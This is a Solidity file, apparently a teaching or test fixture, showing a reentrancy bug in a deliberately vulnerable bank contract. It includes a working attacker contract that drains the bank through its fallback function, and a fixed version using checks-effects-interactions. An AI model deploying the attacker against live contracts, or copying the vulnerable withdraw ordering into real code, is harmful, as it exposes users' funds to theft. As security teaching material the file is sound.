// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Reentrancy Vulnerable Contract
 * @notice DELIBERATELY VULNERABLE - For testing purposes only
 *
 * Vulnerability: Classic reentrancy attack
 * Impact: Attacker can drain all funds from the contract
 * CWE: CWE-841 (Improper Enforcement of Behavioral Workflow)
 *
 * Attack Vector:
 * 1. Attacker deposits ETH
 * 2. Attacker calls withdraw()
 * 3. In fallback function, attacker calls withdraw() again
 * 4. Balance not updated until after external call
 * 5. Attacker drains contract
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @notice Deposit ETH into the bank
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw all deposited ETH
     * @dev VULNERABLE: Calls external contract before updating state
     */
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State update happens AFTER external call
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, balance);
    }

    /**
     * @notice Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Reentrancy Attacker Contract
 * @notice Attack contract to exploit the reentrancy vulnerability
 */
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    /**
     * @notice Start the attack
     */
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");

        // Deposit ETH
        vulnerableBank.deposit{value: msg.value}();

        // Start reentrancy attack
        attackCount = 0;
        vulnerableBank.withdraw();
    }

    /**
     * @notice Fallback function - called during withdraw
     * @dev This is where the reentrancy happens
     */
    fallback() external payable {
        attackCount++;

        // Reenter if contract still has funds and we haven't looped too much
        if (address(vulnerableBank).balance >= 1 ether && attackCount < 10) {
            vulnerableBank.withdraw();
        }
    }

    /**
     * @notice Withdraw stolen funds
     */
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

/**
 * @title Fixed Bank Contract
 * @notice Secure version using checks-effects-interactions pattern
 */
contract SecureBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Secure withdraw using checks-effects-interactions
     */
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // FIXED: Update state BEFORE external call
        balances[msg.sender] = 0;

        // External call happens AFTER state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
